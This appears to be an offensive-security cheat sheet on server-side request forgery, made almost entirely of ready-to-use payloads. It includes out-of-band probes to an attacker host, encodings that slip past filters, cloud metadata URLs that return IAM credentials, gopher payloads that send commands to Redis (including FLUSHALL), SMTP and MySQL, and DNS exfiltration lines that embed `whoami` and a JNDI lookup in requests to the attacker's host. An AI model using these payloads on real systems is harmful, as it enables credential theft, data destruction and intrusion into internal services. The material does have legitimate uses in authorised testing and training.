---
title: SSRF (Server-Side Request Forgery)
category: web
description: Reach internal services, cloud metadata, and chain to RCE.
tags: [ssrf, web]
os: [any]
order: 40
---

## Confirm out-of-band

```text
http://{{LHOST}}/ssrf-probe
http://burpcollab.example.net/
http://<random>.oastify.com/
```

## Internal targets

```text
http://127.0.0.1/      http://localhost/      http://[::1]/
http://0.0.0.0/        http://127.1/
http://127.0.0.1:8080/admin
http://10.0.0.5/       http://169.254.169.254/
file:///etc/passwd     gopher://127.0.0.1:6379/_FLUSHALL
```

## Bypass filters

```text
http://127.0.0.1@example.com/        (userinfo trick)
http://example.com#@127.0.0.1/
http://2130706433/                   (decimal of 127.0.0.1)
http://017700000001/                 (octal)
http://0x7f.0x0.0x0.0x1/             (hex octets)
http://127.0.0.1.nip.io/             (DNS rebinding setup)
http://localtest.me/                 (resolves to 127.0.0.1)
```

## Cloud metadata endpoints

```text
# AWS (IMDSv1 — many envs forced IMDSv2 now)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# AWS IMDSv2 (needs PUT for token — bypass via header smuggling)
X-aws-ec2-metadata-token-ttl-seconds: 21600
PUT /latest/api/token

# GCP
http://metadata.google.internal/computeMetadata/v1/?recursive=true
# Header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true

# DigitalOcean
http://169.254.169.254/metadata/v1.json

# Oracle Cloud
http://192.0.0.192/latest/
```

## Gopher → SMTP / Redis / MySQL

```text
gopher://127.0.0.1:25/_HELO%20a%0d%0aMAIL%20FROM:...
gopher://127.0.0.1:6379/_*3%0d%0a%243%0d%0aSET%0d%0a%241%0d%0ax%0d%0a%245%0d%0ahello
```

Use `gopherus` to generate Redis/MySQL/SMTP payloads.

## Blind SSRF → DNS exfil

```text
http://`whoami`.{{LHOST}}/
http://${jndi:dns://{{LHOST}}}
```
